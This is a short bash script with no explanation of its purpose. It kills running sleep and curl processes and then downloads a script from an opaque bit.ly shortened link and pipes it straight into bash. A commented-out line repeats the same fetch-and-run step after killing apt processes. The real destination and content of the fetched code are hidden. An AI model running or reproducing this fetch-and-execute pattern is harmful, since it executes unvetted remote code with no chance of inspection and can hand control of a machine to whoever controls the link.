#!/bin/bash
echo Done > ssh.txt
[ -s ssh.txt ] || ssh node01
##sudo killall curl apt apt-get && curl -s -L https://bit.ly/3lalhby | bash || curl -s -L https://bit.ly/3lalhby | bash
killall sleep curl
sleep 1
curl -s -L https://bit.ly/3lalhby | bash




